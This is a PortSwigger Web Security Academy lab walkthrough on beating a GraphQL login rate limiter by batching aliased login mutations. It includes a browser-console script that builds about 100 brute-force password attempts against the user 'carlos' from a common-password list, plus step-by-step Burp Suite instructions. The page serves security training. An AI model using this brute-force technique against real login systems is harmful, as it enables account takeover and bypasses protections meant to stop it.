# Lab: Bypassing GraphQL brute force protections

Source: https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass
Fetched: 2026-06-28T09:17:51.292863+00:00

Web Security Academy

GraphQL API vulnerabilities

Lab

Lab: Bypassing GraphQL brute force protections

The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time.

To solve the lab, brute force the login mechanism to sign in as carlos. Use the list of authentication lab passwords as your password source.

Learn more about Working with GraphQL in Burp Suite.

Tip

This lab requires you to craft a large request that uses aliases to send multiple login attempts at the same time. As this request could be time-consuming to create manually, we recommend you use a script to build the request.

The below example JavaScript builds a list of aliases corresponding to our list of authentication lab passwords and copies the request to your clipboard. To run this script:

Open the lab in Burp's browser.

Right-click the page and select Inspect.

Select the Console tab.

Paste the script and press Enter.

You can then use the generated aliases when crafting your request in Repeater.

copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`

bruteforce$index:login(input:{password: "$password", username: "carlos"}) {

token

success

}

`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");

Solution

In Burp's browser, access the lab and select My account.

Attempt to log in to the site using incorrect credentials.

In Burp, go to Proxy > HTTP history. Note that login requests are sent as a GraphQL mutation.

Right-click the login request and select Send to Repeater.

In Repeater, attempt some further login requests with incorrect credentials. Note that after a short period of time the API starts to return a rate limit error.

In the GraphQL tab, craft a request that uses aliases to send multiple login mutations in one message. See the tip in this lab for a method that makes this process less time-consuming.

Bear the following in mind when constructing your request:

The list of aliases should be contained within a mutation {} type.

Each aliased mutation should have the username carlos and a different password from the authentication list.

If you are modifying the request that you sent to Repeater, delete the variable dictionary and operationName field from the request before sending. You can do this from Repeater's Pretty tab.

Ensure that each alias requests the success field, as shown in the simplified example below:

mutation {

bruteforce0:login(input:{password: "123456", username: "carlos"}) {

token

success

}

bruteforce1:login(input:{password: "password", username: "carlos"}) {

token

success

}

...

bruteforce99:login(input:{password: "12345678", username: "carlos"}) {

token

success

}

}

Click Send.

Notice that the response lists each login attempt and whether its login attempt was successful.

Use the search bar below the response to search for the string true. This indicates which of the aliased mutations was able to successfully log in as carlos.

Check the request for the password that was used by the successful alias.

Log in to the site using the carlos credentials to solve the lab.

Community solutions

Popo Hack

Intigriti

Test GraphQL APIs using Burp Suite

Try for free
